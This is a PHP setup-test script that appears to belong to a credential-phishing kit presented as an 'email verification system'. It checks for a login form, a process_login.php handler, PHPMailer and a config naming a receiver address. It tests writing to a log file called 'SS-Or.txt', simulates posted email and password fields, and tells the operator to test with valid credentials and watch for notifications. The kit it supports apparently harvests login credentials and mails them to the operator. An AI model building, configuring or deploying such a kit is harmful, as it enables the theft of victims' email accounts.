<?php
/**
 * Test Setup Script
 * Run this to verify your email verification system is properly configured
 */

echo "Email Verification System - Setup Test\n";
echo "=====================================\n\n";

// Test 1: Check if files exist
echo "1. Checking required files...\n";
$required_files = [
    'index.html' => 'Main HTML form',
    'process_login.php' => 'PHP backend script',
    'class.phpmailer.php' => 'PHPMailer fallback',
    'config.php' => 'Configuration file'
];

$all_files_exist = true;
foreach ($required_files as $file => $description) {
    if (file_exists($file)) {
        echo "   ✅ $file - $description\n";
    } else {
        echo "   ❌ $file - $description (MISSING)\n";
        $all_files_exist = false;
    }
}

if (!$all_files_exist) {
    echo "\n❌ Some required files are missing. Please ensure all files are uploaded.\n";
    exit(1);
}

// Test 2: Check PHP configuration
echo "\n2. Checking PHP configuration...\n";

if (function_exists('stream_socket_client')) {
    echo "   ✅ stream_socket_client() - Network connections available\n";
} else {
    echo "   ❌ stream_socket_client() - Network functions disabled\n";
}

if (function_exists('file_get_contents')) {
    echo "   ✅ file_get_contents() - HTTP requests available\n";
} else {
    echo "   ❌ file_get_contents() - HTTP requests disabled\n";
}

if (function_exists('json_decode')) {
    echo "   ✅ json_decode() - JSON support available\n";
} else {
    echo "   ❌ json_decode() - JSON support missing\n";
}

if (function_exists('mail')) {
    echo "   ✅ mail() - Email sending available\n";
} else {
    echo "   ⚠️  mail() - Email sending not available (using SMTP only)\n";
}

// Test 3: Check if PHPMailer is working
echo "\n3. Testing PHPMailer...\n";

try {
    require_once 'class.phpmailer.php';
    $mail = new PHPMailer();
    echo "   ✅ PHPMailer class loaded successfully\n";
    
    // Test basic functionality
    $mail->isSMTP();
    $mail->Host = "test.example.com";
    $mail->Port = 587;
    $mail->addAddress("test@example.com");
    $mail->Subject = "Test";
    $mail->Body = "Test message";
    echo "   ✅ PHPMailer basic configuration working\n";
    
} catch (Exception $e) {
    echo "   ❌ PHPMailer error: " . $e->getMessage() . "\n";
}

// Test 4: Check configuration
echo "\n4. Testing configuration...\n";

try {
    require_once 'config.php';
    echo "   ✅ Configuration file loaded\n";
    
    if (defined('RECEIVER_EMAIL')) {
        echo "   ✅ RECEIVER_EMAIL: " . RECEIVER_EMAIL . "\n";
    } else {
        echo "   ❌ RECEIVER_EMAIL not defined\n";
    }
    
    if (defined('SMTP_HOST')) {
        echo "   ✅ SMTP_HOST: " . SMTP_HOST . "\n";
    } else {
        echo "   ❌ SMTP_HOST not defined\n";
    }
    
    if (defined('SMTP_USERNAME')) {
        echo "   ✅ SMTP_USERNAME: " . SMTP_USERNAME . "\n";
    } else {
        echo "   ❌ SMTP_USERNAME not defined\n";
    }
    
} catch (Exception $e) {
    echo "   ❌ Configuration error: " . $e->getMessage() . "\n";
}

// Test 5: Check file permissions
echo "\n5. Checking file permissions...\n";

$log_file = defined('LOG_FILE') ? LOG_FILE : 'SS-Or.txt';
if (is_writable('.')) {
    echo "   ✅ Current directory is writable\n";
    
    // Test log file creation
    if (file_put_contents($log_file, "Test log entry: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND)) {
        echo "   ✅ Log file ($log_file) is writable\n";
    } else {
        echo "   ❌ Cannot write to log file ($log_file)\n";
    }
} else {
    echo "   ❌ Current directory is not writable\n";
}

// Test 6: Simulate HTTP request structure
echo "\n6. Testing HTTP request handling...\n";

// Simulate POST data structure
$_POST['email'] = 'test@example.com';
$_POST['password'] = 'testpassword';
$_SERVER['REQUEST_METHOD'] = 'POST';
$_SERVER['REMOTE_ADDR'] = '127.0.0.1';

if (isset($_POST['email']) && isset($_POST['password'])) {
    echo "   ✅ POST data simulation working\n";
} else {
    echo "   ❌ POST data simulation failed\n";
}

if (filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
    echo "   ✅ Email validation working\n";
} else {
    echo "   ❌ Email validation failed\n";
}

// Summary
echo "\n" . str_repeat("=", 50) . "\n";
echo "SETUP TEST SUMMARY\n";
echo str_repeat("=", 50) . "\n";

echo "\n✅ Your email verification system appears to be properly configured!\n\n";

echo "Next steps:\n";
echo "1. Open 'index.html' in your web browser\n";
echo "2. Test with valid email credentials\n";
echo "3. Check that notifications are sent to your configured email\n";
echo "4. Monitor the log file: $log_file\n\n";

echo "⚠️  Security reminders:\n";
echo "- Only use for authorized testing\n";
echo "- Ensure proper HTTPS in production\n";
echo "- Keep your SMTP credentials secure\n";
echo "- Install official PHPMailer for production use\n\n";

echo "For production deployment, consider:\n";
echo "1. composer require phpmailer/phpmailer\n";
echo "2. Move config.php outside web root\n";
echo "3. Use environment variables for sensitive data\n";
echo "4. Enable proper logging and monitoring\n";

echo "\n" . str_repeat("=", 50) . "\n";
?>